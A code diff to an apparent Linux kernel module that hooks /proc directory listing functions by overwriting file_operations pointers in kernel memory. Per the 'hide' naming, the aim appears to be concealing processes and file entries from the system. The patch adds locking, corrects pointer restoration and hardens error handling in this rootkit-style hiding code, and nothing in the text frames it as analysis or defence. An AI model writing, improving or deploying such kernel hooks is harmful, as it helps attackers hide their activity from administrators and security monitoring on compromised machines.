@@ -20,6 +20,7 @@ typedef int hide_filldir_ret_t;
 #define HIDE_FILLDIR_OK 0
 #define HIDE_FILLDIR_FULL 1
 #include <linux/module.h>
+#include <linux/mutex.h>
 #include <linux/spinlock.h>
 #include <linux/uidgid.h>
 #include <linux/atomic.h>
@@ -62,6 +63,7 @@ struct hooked_fops {
 static struct hooked_fops hooked_fops[MAX_HOOKED_OPS];
 static int hooked_fops_count = 0;
 static DEFINE_SPINLOCK(syshook_lock);
+static DEFINE_MUTEX(syshook_mutex);
 static atomic_t hook_active = ATOMIC_INIT(0);
 
 static int memd_iter_off(void)
@@ -167,19 +169,19 @@ static int memd_iterate_shared(struct file *filp, struct dir_context *ctx)
 }
 
 static int hook_proc_dir(const char *path)
- {
-    struct file *f;
-    const struct file_operations *ops;
-    iterate_shared_fn orig;
-    int i;
+  {
+     struct file *f;
+     const struct file_operations *ops;
+     iterate_shared_fn orig;
+     unsigned long flags;
+     int i;
+     int ret;
 
-    if (hooked_fops_count >= MAX_HOOKED_OPS)
-        return -ENOSPC;
-
-    if (memd_filp_open(path, O_RDONLY | O_DIRECTORY, 0, &f) != 0)
-        return -ENOSPC;
-    if (IS_ERR(f))
-        return PTR_ERR(f);
+     ret = memd_filp_open(path, O_RDONLY | O_DIRECTORY, 0, &f);
+     if (ret != 0)
+         return ret;
+     if (IS_ERR(f))
+         return PTR_ERR(f);
 
     ops = memd_file_fop(f);
     memd_filp_close(&f, NULL);
@@ -190,54 +192,72 @@ static int hook_proc_dir(const char *path)
     orig = (iterate_shared_fn)memd_iter_get(ops);
     memd_err("hide install: %s f_op=%px iterate=%px\n", path, ops, orig);
 
+    /* Check-then-add must be atomic: concurrent installs would
+     * overflow MAX_HOOKED_OPS or insert duplicates. Sleepable open
+     * above stays outside the lock; only the array update is
+     * guarded. */
+    spin_lock_irqsave(&syshook_lock, flags);
     for (i = 0; i < hooked_fops_count; i++) {
-        if (hooked_fops[i].ops == ops)
+        if (hooked_fops[i].ops == ops) {
+            spin_unlock_irqrestore(&syshook_lock, flags);
             return 0;
+        }
+    }
+    if (hooked_fops_count >= MAX_HOOKED_OPS) {
+        spin_unlock_irqrestore(&syshook_lock, flags);
+        return -ENOSPC;
     }
 
     hooked_fops[hooked_fops_count].ops = ops;
     hooked_fops[hooked_fops_count].orig_iterate = orig;
     hooked_fops[hooked_fops_count].path = path;
     hooked_fops_count++;
+    spin_unlock_irqrestore(&syshook_lock, flags);
 
     return 0;
-}
+ }
 
-static int install_hooks_on_fops(const struct file_operations *ops, iterate_shared_fn new_iter)
- {
-    int wr;
+static int install_hooks_on_fops(const struct file_operations *ops, iterate_shared_fn new_iter,
+                                   iterate_shared_fn orig_iter)
+  {
+     int wr;
+     iterate_shared_fn back;
 
-    wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
-                            (unsigned long)new_iter);
-    if (wr) {
-        memd_err("hide install: table write failed\n");
-        return -EIO;
-    }
+     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
+                             (unsigned long)new_iter);
+     if (wr) {
+         memd_err("hide install: table write failed\n");
+         return -EIO;
+     }
 
-    iterate_shared_fn back = (iterate_shared_fn)memd_iter_get(ops);
-    if (!back || back != new_iter) {
-        memd_err("hide install: readback mismatch\n");
-        memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
-                           (unsigned long)hooked_fops[0].orig_iterate);
-        return -EIO;
-    }
+     back = (iterate_shared_fn)memd_iter_get(ops);
+     if (!back || back != new_iter) {
+         memd_err("hide install: readback mismatch\n");
+         /* Restore THIS table's original, not entry 0's (the old
+          * code corrupted table N with table 0's pointer when
+          * several distinct f_ops were hooked). */
+         memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
+                            (unsigned long)orig_iter);
+         return -EIO;
+     }
 
-    return 0;
-}
+     return 0;
+ }
 
 static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_shared_fn orig_iter)
- {
-    int wr;
+  {
+     int wr;
+     iterate_shared_fn back;
 
-    wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
-                            (unsigned long)orig_iter);
-    if (wr) {
-        memd_err("hide uninstall: table write failed\n");
-        return -EIO;
-    }
+     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
+                             (unsigned long)orig_iter);
+     if (wr) {
+         memd_err("hide uninstall: table write failed\n");
+         return -EIO;
+     }
 
-    iterate_shared_fn back = (iterate_shared_fn)memd_iter_get(ops);
-    if (!back || back != orig_iter) {
+     back = (iterate_shared_fn)memd_iter_get(ops);
+     if (!back || back != orig_iter) {
         memd_err("hide uninstall: readback mismatch\n");
         return -EIO;
     }
@@ -246,84 +266,111 @@ static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_
 }
 
 int memd_hide_install(void)
- {
-    unsigned long flags;
-    int ret = 0;
-    int i;
+  {
+     static const char *proc_dirs[] = {
+         "/proc",
+         "/proc/self/task",
+         "/proc/self/fd",
+         "/proc/self/fdinfo",
+         "/proc/self/ns",
+         NULL
+     };
+     unsigned long flags;
+     int ret = 0;
+     int i;
+     int installed;
 
-    spin_lock_irqsave(&syshook_lock, flags);
-    if (atomic_read(&hook_active)) {
-        spin_unlock_irqrestore(&syshook_lock, flags);
-        return 0;
-    }
-    spin_unlock_irqrestore(&syshook_lock, flags);
+     /* Serialize against concurrent install/uninstall: the array,
+      * count, and table writes must not interleave (spinlock alone
+      * cannot span the sleepable filp_open/table writes). */
+     mutex_lock(&syshook_mutex);
 
-    const char *proc_dirs[] = {
-        "/proc",
-        "/proc/self/task",
-        "/proc/self/fd",
-        "/proc/self/fdinfo",
-        "/proc/self/ns",
-        NULL
-    };
+     spin_lock_irqsave(&syshook_lock, flags);
+     if (atomic_read(&hook_active)) {
+         spin_unlock_irqrestore(&syshook_lock, flags);
+         mutex_unlock(&syshook_mutex);
+         return 0;
+     }
+     spin_unlock_irqrestore(&syshook_lock, flags);
 
-    for (i = 0; proc_dirs[i]; i++) {
-        ret = hook_proc_dir(proc_dirs[i]);
-        if (ret && ret != -ENOSYS) {
-            memd_err("hide install: failed to hook %s: %d\n", proc_dirs[i], ret);
-            goto fail;
-        }
-    }
+     for (i = 0; proc_dirs[i]; i++) {
+         ret = hook_proc_dir(proc_dirs[i]);
+         if (ret && ret != -ENOSYS) {
+             memd_err("hide install: failed to hook %s: %d\n", proc_dirs[i], ret);
+             goto fail;
+         }
+     }
 
-    for (i = 0; i < hooked_fops_count; i++) {
-        ret = install_hooks_on_fops(hooked_fops[i].ops, memd_iterate_shared);
-        if (ret) {
-            memd_err("hide install: failed to install hook on %s: %d\n", hooked_fops[i].path, ret);
-            goto fail;
-        }
-    }
+     installed = 0;
+     for (i = 0; i < hooked_fops_count; i++) {
+         ret = install_hooks_on_fops(hooked_fops[i].ops, memd_iterate_shared,
+                                     hooked_fops[i].orig_iterate);
+         if (ret) {
+             memd_err("hide install: failed to install hook on %s: %d\n", hooked_fops[i].path, ret);
+             goto fail;
+         }
+         installed++;
+     }
 
-    spin_lock_irqsave(&syshook_lock, flags);
-    atomic_set(&hook_active, 1);
-    spin_unlock_irqrestore(&syshook_lock, flags);
+     spin_lock_irqsave(&syshook_lock, flags);
+     atomic_set(&hook_active, 1);
+     spin_unlock_irqrestore(&syshook_lock, flags);
 
-    memd_info("hide: installed hooks on %d proc directories\n", hooked_fops_count);
-    return 0;
+     memd_info("hide: installed hooks on %d proc directories\n", hooked_fops_count);
+     mutex_unlock(&syshook_mutex);
+     return 0;
 
-fail:
-    for (i = 0; i < hooked_fops_count; i++) {
-        uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
-    }
-    hooked_fops_count = 0;
-    return ret;
-}
+ fail:
+     for (i = 0; i < installed; i++) {
+         uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
+     }
+     spin_lock_irqsave(&syshook_lock, flags);
+     hooked_fops_count = 0;
+     spin_unlock_irqrestore(&syshook_lock, flags);
+     mutex_unlock(&syshook_mutex);
+     return ret;
+ }
 
 int memd_hide_uninstall(void)
- {
-    unsigned long flags;
-    int ret = 0;
-    int i;
+  {
+     unsigned long flags;
+     int ret = 0;
+     int err = 0;
+     int i;
+     int count;
 
-    spin_lock_irqsave(&syshook_lock, flags);
-    if (!atomic_read(&hook_active)) {
-        spin_unlock_irqrestore(&syshook_lock, flags);
-        return 0;
-    }
-    atomic_set(&hook_active, 0);
-    spin_unlock_irqrestore(&syshook_lock, flags);
+     mutex_lock(&syshook_mutex);
 
-    for (i = 0; i < hooked_fops_count; i++) {
-        ret = uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
-        if (ret) {
-            memd_err("hide uninstall: failed to uninstall hook on %s: %d\n", hooked_fops[i].path, ret);
-        }
-    }
+     spin_lock_irqsave(&syshook_lock, flags);
+     if (!atomic_read(&hook_active)) {
+         spin_unlock_irqrestore(&syshook_lock, flags);
+         mutex_unlock(&syshook_mutex);
+         return 0;
+     }
+     count = hooked_fops_count;
+     spin_unlock_irqrestore(&syshook_lock, flags);
 
-    hooked_fops_count = 0;
+     for (i = 0; i < count; i++) {
+         ret = uninstall_hooks_from_fops(hooked_fops[i].ops, hooked_fops[i].orig_iterate);
+         if (ret) {
+             memd_err("hide uninstall: failed to uninstall hook on %s: %d\n", hooked_fops[i].path, ret);
+             err = ret;
+         }
+     }
 
-    memd_info("hide: uninstalled hooks from %d proc directories\n", i);
-    return ret;
-}
+     /* Keep the bookkeeping (and hook_active) when a restore failed:
+      * clearing it would lose the orig pointer while the table still
+      * points at our code (dangling after rmmod). */
+     if (!err) {
+         spin_lock_irqsave(&syshook_lock, flags);
+         atomic_set(&hook_active, 0);
+         hooked_fops_count = 0;
+         spin_unlock_irqrestore(&syshook_lock, flags);
+         memd_info("hide: uninstalled hooks from %d proc directories\n", count);
+     }
+     mutex_unlock(&syshook_mutex);
+     return err;
+ }
 
 int memd_hide_active(void)
  {
